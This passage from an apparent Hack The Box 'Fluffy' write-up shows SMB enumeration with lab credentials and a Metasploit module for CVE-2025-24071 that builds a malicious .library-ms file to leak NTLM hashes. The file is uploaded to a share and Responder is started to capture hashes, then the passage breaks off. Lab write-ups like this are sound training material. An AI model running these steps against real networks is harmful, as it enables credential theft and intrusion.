+</span></span><span class="line"><span class="cl"><span class="c1"># search result</span>
+</span></span><span class="line"><span class="cl">search: <span class="m">2</span>
+</span></span><span class="line"><span class="cl">result: <span class="m">0</span> Success
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># numResponses: 5</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># numEntries: 1</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># numReferences: 3</span>
+</span></span></code></pre></div><p>It’s of no use getting nowhere , reviewing the result of nmap</p>
+<p>the ports available and there services</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">53/tcp   open  domain                Simple DNS Plus
+</span></span><span class="line"><span class="cl">88/tcp   open  kerberos-sec          Microsoft Windows Kerberos <span class="o">(</span>server time: 2025-07-07 15:23:45Z<span class="o">)</span>
+</span></span><span class="line"><span class="cl">139/tcp  open  netbios-ssn?
+</span></span><span class="line"><span class="cl">389/tcp  open  ldap
+</span></span><span class="line"><span class="cl">445/tcp  open  microsoft-ds?
+</span></span><span class="line"><span class="cl">464/tcp  open  kpasswd5?
+</span></span><span class="line"><span class="cl">593/tcp  open  ncacn_http            Microsoft Windows RPC over HTTP 1.0
+</span></span><span class="line"><span class="cl">636/tcp  open  ssl/ldap              Microsoft Windows Active Directory LDAP
+</span></span><span class="line"><span class="cl">5985/tcp open  http                  Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
+</span></span><span class="line"><span class="cl">3269/tcp open  ssl/globalcatLDAPssl?
+</span></span></code></pre></div><p>The i tried SMB authentication test: using the creds i.e.  <code>j.fleischman / J0elTHEM4n1990!</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ smbclient -L //10.10.11.69 -U <span class="s2">&#34;fluffy.htb\\j.fleischman&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Password <span class="k">for</span> <span class="o">[</span>FLUFFY.HTB<span class="se">\j</span>.fleischman<span class="o">]</span>:
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	Sharename       Type      Comment
+</span></span><span class="line"><span class="cl">	---------       ----      -------
+</span></span><span class="line"><span class="cl">	ADMIN$          Disk      Remote Admin
+</span></span><span class="line"><span class="cl">	C$              Disk      Default share
+</span></span><span class="line"><span class="cl">	IPC$            IPC       Remote IPC
+</span></span><span class="line"><span class="cl">	IT              Disk      
+</span></span><span class="line"><span class="cl">	NETLOGON        Disk      Logon server share 
+</span></span><span class="line"><span class="cl">	SYSVOL          Disk      Logon server share 
+</span></span><span class="line"><span class="cl">Reconnecting with SMB1 <span class="k">for</span> workgroup listing.
+</span></span><span class="line"><span class="cl">do_connect: Connection to 10.10.11.69 failed <span class="o">(</span>Error NT_STATUS_RESOURCE_NAME_NOT_FOUND<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Unable to connect with SMB1 -- no workgroup available
+</span></span><span class="line"><span class="cl">                                                                                                                                                              
+</span></span><span class="line"><span class="cl">┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ smbclient //10.10.11.69/IT -U <span class="s2">&#34;fluffy.htb\\j.fleischman&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Password <span class="k">for</span> <span class="o">[</span>FLUFFY.HTB<span class="se">\j</span>.fleischman<span class="o">]</span>:
+</span></span><span class="line"><span class="cl">Try <span class="s2">&#34;help&#34;</span> to get a list of possible commands.
+</span></span><span class="line"><span class="cl">smb: <span class="se">\&gt;</span> ls
+</span></span><span class="line"><span class="cl">  .                                   D        <span class="m">0</span>  Mon Jul  <span class="m">7</span> 12:57:32 <span class="m">2025</span>
+</span></span><span class="line"><span class="cl">  ..                                  D        <span class="m">0</span>  Mon Jul  <span class="m">7</span> 12:57:32 <span class="m">2025</span>
+</span></span><span class="line"><span class="cl">  Everything-1.4.1.1026.x64           D        <span class="m">0</span>  Fri Apr <span class="m">18</span> 11:08:44 <span class="m">2025</span>
+</span></span><span class="line"><span class="cl">  Everything-1.4.1.1026.x64.zip       A  <span class="m">1827464</span>  Fri Apr <span class="m">18</span> 11:04:05 <span class="m">2025</span>
+</span></span><span class="line"><span class="cl">  exploit.zip                         A      <span class="m">319</span>  Mon Jul  <span class="m">7</span> 12:57:33 <span class="m">2025</span>
+</span></span><span class="line"><span class="cl">  KeePass-2.58                        D        <span class="m">0</span>  Fri Apr <span class="m">18</span> 11:08:38 <span class="m">2025</span>
+</span></span><span class="line"><span class="cl">  KeePass-2.58.zip                    A  <span class="m">3225346</span>  Fri Apr <span class="m">18</span> 11:03:17 <span class="m">2025</span>
+</span></span><span class="line"><span class="cl">  Upgrade_Notice.pdf                  A   <span class="m">169963</span>  Sat May <span class="m">17</span> 10:31:07 <span class="m">2025</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">		<span class="m">5842943</span> blocks of size 4096. <span class="m">2034527</span> blocks available
+</span></span><span class="line"><span class="cl">smb: <span class="se">\&gt;</span> get exploit.zip
+</span></span><span class="line"><span class="cl">NT_STATUS_OBJECT_NAME_NOT_FOUND opening remote file <span class="se">\e</span>xploit.zip
+</span></span><span class="line"><span class="cl">smb: <span class="se">\&gt;</span> get KeePass-2.58.zip
+</span></span><span class="line"><span class="cl">parallel_read returned NT_STATUS_IO_TIMEOUT
+</span></span><span class="line"><span class="cl">smb: <span class="se">\&gt;</span> get Upgrade_Notice.pdf
+</span></span><span class="line"><span class="cl">getting file <span class="se">\U</span>pgrade_Notice.pdf of size <span class="m">169963</span> as Upgrade_Notice.pdf <span class="o">(</span>13.6 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 13.6 KiloBytes/sec<span class="o">)</span>
+</span></span><span class="line"><span class="cl">smb: <span class="se">\&gt;</span> 
+</span></span></code></pre></div><p>I then looked in the .pdf file</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ ls
+</span></span><span class="line"><span class="cl">Assembly_x-64  Desktop  Documents  Downloads  exploit  KeePass-2.58.zip  linpeas.sh  Music  Pictures  Public  Templates  **Upgrade_Notice.pdf**  Videos  work
+</span></span><span class="line"><span class="cl">                                                                                                                                                                                                                                              
+</span></span><span class="line"><span class="cl">┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ xdg-open Upgrade_Notice.pdf
+</span></span></code></pre></div><figure><img src="image%201.png"
+    alt="Fluffy" width="600">
+</figure>
+
+<p>The .pdf revealed some of the CVEs the application is vulnerable too.</p>
+<p>I Looked for all the CVE’s and I got this</p>
+<figure><img src="image%202.png"
+    alt="Fluffy" width="800">
+</figure>
+
+<p>it is an exploit of <code>CVE-2025-24071</code></p>
+<p><a href="https://www.notion.so/CVE-2025-24071-2-27b5bb87e269802ebd1fd6f19556af3a?pvs=21">CVE-2025-24071 (2)</a></p>
+<p>Then following the commands i created the exploit under the name of <code>exploit.zip</code>  and then used the <code>put command</code> to send it to the target device for execution</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ msfconsole 
+</span></span><span class="line"><span class="cl">Metasploit tip: View all productivity tips with the tips <span class="nb">command</span>
+</span></span><span class="line"><span class="cl">                                                  
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">                 _---------.
+</span></span><span class="line"><span class="cl">             .<span class="s1">&#39; #######   ;.&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s1">  .---,.    ;@             @@`;   .---,..
+</span></span></span><span class="line"><span class="cl"><span class="s1">.&#34; @@@@@&#39;</span>.,<span class="s1">&#39;@@            @@@@@&#39;</span>,.<span class="s1">&#39;@@@@ &#34;.
+</span></span></span><span class="line"><span class="cl"><span class="s1">&#39;</span>-.@@@@@@@@@@@@@          @@@@@@@@@@@@@ @<span class="p">;</span>
+</span></span><span class="line"><span class="cl">   <span class="sb">`</span>.@@@@@@@@@@@@        @@@@@@@@@@@@@@ .<span class="s1">&#39;
+</span></span></span><span class="line"><span class="cl"><span class="s1">     &#34;--&#39;</span>.@@@  -.@        @ ,<span class="s1">&#39;-   .&#39;</span>--<span class="s2">&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s2">          &#34;</span>.@<span class="s1">&#39; ; @       @ `.  ;&#39;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">|</span>@@@@ @@@     @    .
+</span></span><span class="line"><span class="cl">             <span class="s1">&#39; @@@ @@   @@    ,
+</span></span></span><span class="line"><span class="cl"><span class="s1">              `.@@@@    @@   .
+</span></span></span><span class="line"><span class="cl"><span class="s1">                &#39;</span>,@@     @   <span class="p">;</span>           _____________
+</span></span><span class="line"><span class="cl">                 <span class="o">(</span>   <span class="m">3</span> C    <span class="o">)</span>     /<span class="p">|</span>___ / Metasploit! <span class="se">\
+</span></span></span><span class="line"><span class="cl">                 <span class="p">;</span>@<span class="s1">&#39;. __*__,.&#34;    \|--- \_____________/
+</span></span></span><span class="line"><span class="cl"><span class="s1">                  &#39;</span><span class="o">(</span>.,....<span class="s2">&#34;/
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">       =[ metasploit v6.4.50-dev                          ]
+</span></span></span><span class="line"><span class="cl"><span class="s2">+ -- --=[ 2496 exploits - 1283 auxiliary - 431 post       ]
+</span></span></span><span class="line"><span class="cl"><span class="s2">+ -- --=[ 1610 payloads - 49 encoders - 13 nops           ]
+</span></span></span><span class="line"><span class="cl"><span class="s2">+ -- --=[ 9 evasion                                       ]
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">Metasploit Documentation: https://docs.metasploit.com/
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">msf6 &gt; use auxiliary/server/ntlm_hash_leak
+</span></span></span><span class="line"><span class="cl"><span class="s2">[-] No results from search
+</span></span></span><span class="line"><span class="cl"><span class="s2">[-] Failed to load module: auxiliary/server/ntlm_hash_leak
+</span></span></span><span class="line"><span class="cl"><span class="s2">msf6 &gt; 
+</span></span></span></code></pre></div><p>😞 No module was there so had to <code>clone</code> the repository</p>
+<p>repo link = <a href="https://github.com/FOLKS-iwd/CVE-2025-24071-msfvenom">https://github.com/FOLKS-iwd/CVE-2025-24071-msfvenom</a></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ git clone https://github.com/FOLKS-IWD/CVE-2025-24071-msfvenom.git
+</span></span><span class="line"><span class="cl"><span class="nb">cd</span> CVE-2025-24071-msfvenom
+</span></span><span class="line"><span class="cl">Cloning into <span class="s1">&#39;CVE-2025-24071-msfvenom&#39;</span>...
+</span></span><span class="line"><span class="cl">remote: Enumerating objects: 15, <span class="k">done</span>.
+</span></span><span class="line"><span class="cl">remote: Counting objects: 100% <span class="o">(</span>15/15<span class="o">)</span>, <span class="k">done</span>.
+</span></span><span class="line"><span class="cl">remote: Compressing objects: 100% <span class="o">(</span>13/13<span class="o">)</span>, <span class="k">done</span>.
+</span></span><span class="line"><span class="cl">remote: Total <span class="m">15</span> <span class="o">(</span>delta 2<span class="o">)</span>, reused <span class="m">0</span> <span class="o">(</span>delta 0<span class="o">)</span>, pack-reused <span class="m">0</span> <span class="o">(</span>from 0<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Receiving objects: 100% <span class="o">(</span>15/15<span class="o">)</span>, 6.67 KiB <span class="p">|</span> 6.67 MiB/s, <span class="k">done</span>.
+</span></span><span class="line"><span class="cl">Resolving deltas: 100% <span class="o">(</span>2/2<span class="o">)</span>, <span class="k">done</span>.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/CVE-2025-24071-msfvenom<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ cp ntlm_hash_leak.rb ~/.msf4/modules/auxiliary/server/
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/CVE-2025-24071-msfvenom<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ msfconsole
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Metasploit tip: Writing a custom module? After editing your module, why not try 
+</span></span><span class="line"><span class="cl">the reload <span class="nb">command</span>
+</span></span><span class="line"><span class="cl">                                                  
+</span></span><span class="line"><span class="cl">  +-------------------------------------------------------+
+</span></span><span class="line"><span class="cl">  <span class="p">|</span>  METASPLOIT by Rapid7                                 <span class="p">|</span>
+</span></span><span class="line"><span class="cl">  +---------------------------+---------------------------+
+</span></span><span class="line"><span class="cl">  <span class="p">|</span>      __________________   <span class="p">|</span>                           <span class="p">|</span>
+</span></span><span class="line"><span class="cl">  <span class="p">|</span>  <span class="o">==</span>c<span class="o">(</span>______<span class="o">(</span>o<span class="o">(</span>______<span class="o">(</span>_<span class="o">()</span>  <span class="p">|</span> <span class="p">|</span><span class="s2">&#34;&#34;&#34;&#34;&#34;&#34;&#34;&#34;&#34;&#34;&#34;&#34;</span><span class="p">|</span><span class="o">======[</span>***  <span class="p">|</span>
+</span></span><span class="line"><span class="cl">  <span class="p">|</span>             <span class="o">)=</span><span class="se">\ </span>          <span class="p">|</span> <span class="p">|</span>  EXPLOIT   <span class="se">\ </span>           <span class="p">|</span>
+</span></span><span class="line"><span class="cl">  <span class="p">|</span>            // <span class="se">\\</span>          <span class="p">|</span> <span class="p">|</span>_____________<span class="se">\_</span>______    <span class="p">|</span>
+</span></span><span class="line"><span class="cl">  <span class="p">|</span>           //   <span class="se">\\</span>         <span class="p">|</span> <span class="p">|</span><span class="o">==[</span>msf &gt;<span class="o">]============</span><span class="se">\ </span>  <span class="p">|</span>
+</span></span><span class="line"><span class="cl">  <span class="p">|</span>          //     <span class="se">\\</span>        <span class="p">|</span> <span class="p">|</span>______________________<span class="se">\ </span> <span class="p">|</span>
+</span></span><span class="line"><span class="cl">  <span class="p">|</span>         // RECON <span class="se">\\</span>       <span class="p">|</span> <span class="se">\(</span>@<span class="o">)(</span>@<span class="o">)(</span>@<span class="o">)(</span>@<span class="o">)(</span>@<span class="o">)(</span>@<span class="o">)(</span>@<span class="o">)</span>/   <span class="p">|</span>
+</span></span><span class="line"><span class="cl">  <span class="p">|</span>        //         <span class="se">\\</span>      <span class="p">|</span>  *********************    <span class="p">|</span>
+</span></span><span class="line"><span class="cl">  +---------------------------+---------------------------+
+</span></span><span class="line"><span class="cl">  <span class="p">|</span>      o O o                <span class="p">|</span>        <span class="se">\&#39;\/\/\/</span><span class="s1">&#39;/         |
+</span></span></span><span class="line"><span class="cl"><span class="s1">  |              o O          |         )======(          |
+</span></span></span><span class="line"><span class="cl"><span class="s1">  |                 o         |       .&#39;</span>  LOOT  <span class="s1">&#39;.        |
+</span></span></span><span class="line"><span class="cl"><span class="s1">  | |^^^^^^^^^^^^^^|l___      |      /    _||__   \       |
+</span></span></span><span class="line"><span class="cl"><span class="s1">  | |    PAYLOAD     |&#34;&#34;\___, |     /    (_||_     \      |
+</span></span></span><span class="line"><span class="cl"><span class="s1">  | |________________|__|)__| |    |     __||_)     |     |
+</span></span></span><span class="line"><span class="cl"><span class="s1">  | |(@)(@)&#34;&#34;&#34;**|(@)(@)**|(@) |    &#34;       ||       &#34;     |
+</span></span></span><span class="line"><span class="cl"><span class="s1">  |  = = = = = = = = = = = =  |     &#39;</span>--------------<span class="err">&#39;</span>      <span class="p">|</span>
+</span></span><span class="line"><span class="cl">  +---------------------------+---------------------------+
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">       <span class="o">=[</span> metasploit v6.4.50-dev                          <span class="o">]</span>
+</span></span><span class="line"><span class="cl">+ -- --<span class="o">=[</span> <span class="m">2496</span> exploits - <span class="m">1283</span> auxiliary - <span class="m">431</span> post       <span class="o">]</span>
+</span></span><span class="line"><span class="cl">+ -- --<span class="o">=[</span> <span class="m">1610</span> payloads - <span class="m">49</span> encoders - <span class="m">13</span> nops           <span class="o">]</span>
+</span></span><span class="line"><span class="cl">+ -- --<span class="o">=[</span> <span class="m">9</span> evasion                                       <span class="o">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Metasploit Documentation: https://docs.metasploit.com/
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">msf6 &gt; reload_all
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Reloading modules from all module paths...
+</span></span><span class="line"><span class="cl">/usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/logging-2.4.0/lib/logging.rb:10: warning: /usr/lib/x86_64-linux-gnu/ruby/3.3.0/syslog.so was loaded from the standard library, but will no longer be part of the default gems starting from Ruby 3.4.0.
+</span></span><span class="line"><span class="cl">You can add syslog to your Gemfile or gemspec to silence this warning.
+</span></span><span class="line"><span class="cl">Also please contact the author of logging-2.4.0 to request adding syslog into its gemspec.
+</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> Unknown command: reload. Did you mean load? Run the <span class="nb">help</span> <span class="nb">command</span> <span class="k">for</span> more details.
+</span></span><span class="line"><span class="cl"><span class="c1"># cowsay++</span>
+</span></span><span class="line"><span class="cl"> ____________
+</span></span><span class="line"><span class="cl">&lt; metasploit &gt;
+</span></span><span class="line"><span class="cl"> ------------
+</span></span><span class="line"><span class="cl">       <span class="se">\ </span>  ,__,
+</span></span><span class="line"><span class="cl">        <span class="se">\ </span> <span class="o">(</span>oo<span class="o">)</span>____
+</span></span><span class="line"><span class="cl">           <span class="o">(</span>__<span class="o">)</span>    <span class="o">)</span><span class="se">\
+</span></span></span><span class="line"><span class="cl">              <span class="o">||</span>--<span class="o">||</span> *
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">       <span class="o">=[</span> metasploit v6.4.50-dev                          <span class="o">]</span>
+</span></span><span class="line"><span class="cl">+ -- --<span class="o">=[</span> <span class="m">2496</span> exploits - <span class="m">1284</span> auxiliary - <span class="m">431</span> post       <span class="o">]</span>
+</span></span><span class="line"><span class="cl">+ -- --<span class="o">=[</span> <span class="m">1610</span> payloads - <span class="m">49</span> encoders - <span class="m">13</span> nops           <span class="o">]</span>
+</span></span><span class="line"><span class="cl">+ -- --<span class="o">=[</span> <span class="m">9</span> evasion                                       <span class="o">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Metasploit Documentation: https://docs.metasploit.com/
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">msf6 &gt; use auxiliary/server/ntlm_hash_leak
+</span></span><span class="line"><span class="cl">msf6 auxiliary<span class="o">(</span>server/ntlm_hash_leak<span class="o">)</span> &gt; 
+</span></span></code></pre></div><p>Now the exploit is there and ready to be used!!</p>
+<p>I then set the target ip and verified that everything is configured correctly.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msf6 auxiliary<span class="o">(</span>server/ntlm_hash_leak<span class="o">)</span> &gt; <span class="nb">set</span> attacker_ip 10.10.11.69
+</span></span><span class="line"><span class="cl"><span class="nv">attacker_ip</span> <span class="o">=</span>&gt; 10.10.11.69
+</span></span><span class="line"><span class="cl">msf6 auxiliary<span class="o">(</span>server/ntlm_hash_leak<span class="o">)</span> &gt; show options 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Module options <span class="o">(</span>auxiliary/server/ntlm_hash_leak<span class="o">)</span>:
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">   Name          Current Setting       Required  Description
+</span></span><span class="line"><span class="cl">   ----          ---------------       --------  -----------
+</span></span><span class="line"><span class="cl">   ATTACKER_IP   10.10.11.69           yes       The IP address to which the SMB request will be sent
+</span></span><span class="line"><span class="cl">   FILENAME      exploit.zip           yes       The name of the ZIP file to create
+</span></span><span class="line"><span class="cl">   LIBRARY_NAME  malicious.library-ms  yes       The name of the .library-ms file
+</span></span><span class="line"><span class="cl">   SHARE_NAME    shared                yes       The SMB share name to use in the .library-ms file
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">View the full module info with the info, or info -d command.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">msf6 auxiliary<span class="o">(</span>server/ntlm_hash_leak<span class="o">)</span> &gt; 
+</span></span></code></pre></div><p>Directed to the desired Directory ie <code>Desktop</code> and typed the run command to get the <code>.zip</code> file</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msf6 auxiliary<span class="o">(</span>server/ntlm_hash_leak<span class="o">)</span> &gt; <span class="nb">cd</span> /home/kali/Desktop/
+</span></span><span class="line"><span class="cl">msf6 auxiliary<span class="o">(</span>server/ntlm_hash_leak<span class="o">)</span> &gt; run
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Malicious ZIP file created: exploit.zip
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Host the file and <span class="nb">wait</span> <span class="k">for</span> the victim to extract it.
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Ensure you have an SMB capture server running to collect NTLM hashes.
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Auxiliary module execution completed
+</span></span><span class="line"><span class="cl">msf6 auxiliary<span class="o">(</span>server/ntlm_hash_leak<span class="o">)</span> &gt; 
+</span></span></code></pre></div><p>Now I’ll put the exploit in the target device</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ <span class="nb">cd</span> Desktop                    
+</span></span><span class="line"><span class="cl">                                                                                                                                                              
+</span></span><span class="line"><span class="cl">┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/Desktop<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ ls
+</span></span><span class="line"><span class="cl">exploit.zip
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/Desktop<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ cp malicious.library-ms .library-ms
+</span></span><span class="line"><span class="cl">                                                                                                                                                                                                                                              
+</span></span><span class="line"><span class="cl">┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/Desktop<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ ls
+</span></span><span class="line"><span class="cl">exploit.zip  malicious.library-ms
+</span></span><span class="line"><span class="cl">                                                                                                                                                                                                                                              
+</span></span><span class="line"><span class="cl">┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/Desktop<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ ls -a    
+</span></span><span class="line"><span class="cl">.  ..  exploit.zip  .library-ms  malicious.library-ms
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">                                                                                                                                                              
+</span></span><span class="line"><span class="cl">┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/Desktop<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ smbclient //10.10.11.69/IT -U <span class="s2">&#34;fluffy.htb\\j.fleischman&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Password <span class="k">for</span> <span class="o">[</span>FLUFFY.HTB<span class="se">\j</span>.fleischman<span class="o">]</span>:
+</span></span><span class="line"><span class="cl">Try <span class="s2">&#34;help&#34;</span> to get a list of possible commands.
+</span></span><span class="line"><span class="cl">smb: <span class="se">\&gt;</span> put .library-ms 
+</span></span><span class="line"><span class="cl">putting file .library-ms as <span class="se">\.</span>library-ms <span class="o">(</span>0.1 kb/s<span class="o">)</span> <span class="o">(</span>average 0.1 kb/s<span class="o">)</span>
+</span></span><span class="line"><span class="cl">smb: <span class="se">\&gt;</span> ls
+</span></span><span class="line"><span class="cl">  .                                   D        <span class="m">0</span>  Mon Jul  <span class="m">7</span> 15:17:01 <span class="m">2025</span>
+</span></span><span class="line"><span class="cl">  ..                                  D        <span class="m">0</span>  Mon Jul  <span class="m">7</span> 15:17:01 <span class="m">2025</span>
+</span></span><span class="line"><span class="cl">  .library-ms                         A      <span class="m">365</span>  Mon Jul  <span class="m">7</span> 15:17:02 <span class="m">2025</span>
+</span></span><span class="line"><span class="cl">  Everything-1.4.1.1026.x64           D        <span class="m">0</span>  Fri Apr <span class="m">18</span> 11:08:44 <span class="m">2025</span>
+</span></span><span class="line"><span class="cl">  Everything-1.4.1.1026.x64.zip       A  <span class="m">1827464</span>  Fri Apr <span class="m">18</span> 11:04:05 <span class="m">2025</span>
+</span></span><span class="line"><span class="cl">  KeePass-2.58                        D        <span class="m">0</span>  Fri Apr <span class="m">18</span> 11:08:38 <span class="m">2025</span>
+</span></span><span class="line"><span class="cl">  KeePass-2.58.zip                    A  <span class="m">3225346</span>  Fri Apr <span class="m">18</span> 11:03:17 <span class="m">2025</span>
+</span></span><span class="line"><span class="cl">  Upgrade_Notice.pdf                  A   <span class="m">169963</span>  Sat May <span class="m">17</span> 10:31:07 <span class="m">2025</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">		<span class="m">5842943</span> blocks of size 4096. <span class="m">1548509</span> blocks available
+</span></span></code></pre></div><p>I also set up a listener.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/Desktop<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ sudo responder -I tun0 -wd
+</span></span><span class="line"><span class="cl"><span class="o">[</span>sudo<span class="o">]</span> password <span class="k">for</span> kali: 
+</span></span><span class="line"><span class="cl">                                         __
+</span></span><span class="line"><span class="cl">  .----.-----.-----.-----.-----.-----.--<span class="p">|</span>  <span class="p">|</span>.-----.----.
+</span></span><span class="line"><span class="cl">  <span class="p">|</span>   _<span class="p">|</span>  -__<span class="p">|</span>__ --<span class="p">|</span>  _  <span class="p">|</span>  _  <span class="p">|</span>     <span class="p">|</span>  _  <span class="o">||</span>  -__<span class="p">|</span>   _<span class="p">|</span>
+</span></span><span class="line"><span class="cl">  <span class="p">|</span>__<span class="p">|</span> <span class="p">|</span>_____<span class="p">|</span>_____<span class="p">|</span>   __<span class="p">|</span>_____<span class="p">|</span>__<span class="p">|</span>__<span class="p">|</span>_____<span class="o">||</span>_____<span class="p">|</span>__<span class="p">|</span>
+</span></span><span class="line"><span class="cl">                   <span class="p">|</span>__<span class="p">|</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">           NBT-NS, LLMNR <span class="p">&amp;</span> MDNS Responder 3.1.5.0
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  To support this project:
+</span></span><span class="line"><span class="cl">  Github -&gt; https://github.com/sponsors/lgandx
+</span></span><span class="line"><span class="cl">  Paypal  -&gt; https://paypal.me/PythonResponder
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  Author: Laurent Gaffie <span class="o">(</span>laurent.gaffie@gmail.com<span class="o">)</span>
+</span></span><span class="line"><span class="cl">  To <span class="nb">kill</span> this script hit CTRL-C
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Poisoners:
+</span></span><span class="line"><span class="cl">    LLMNR                      <span class="o">[</span>ON<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    NBT-NS                     <span class="o">[</span>ON<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    MDNS                       <span class="o">[</span>ON<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    DNS                        <span class="o">[</span>ON<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    DHCP                       <span class="o">[</span>ON<span class="o">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Servers:
+</span></span><span class="line"><span class="cl">    HTTP server                <span class="o">[</span>ON<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    HTTPS server               <span class="o">[</span>ON<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    WPAD proxy                 <span class="o">[</span>ON<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    Auth proxy                 <span class="o">[</span>OFF<span class="o">]</span>
